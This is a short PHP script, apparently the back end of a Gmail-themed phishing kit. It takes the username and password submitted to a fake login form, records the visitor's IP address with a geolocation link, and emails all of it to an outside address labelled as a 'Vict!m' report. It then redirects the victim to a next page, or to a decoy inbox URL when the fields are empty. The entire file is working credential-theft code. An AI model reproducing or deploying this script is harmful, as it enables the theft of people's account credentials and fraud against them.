<?
session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$login  = $_POST['user'];
$passwd = $_POST['pass'];
$message .= "--------------gma1lgma1l ONE Info-----------------------\n";
$message .= "U            : ".$_POST['user']."\n";
$message .= "Prod            : ".$_POST['pass']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "| IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$send = "me@emailpostmaster.xyz";
$subject = "R-ONE from ".$_POST['user'];

 if (empty($login) || empty($passwd)) {
header( "Location: index.php?uploaded=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" );
 }
 else {
mail($send,$subject,$message);
 header("Location: next.php");
}
?>
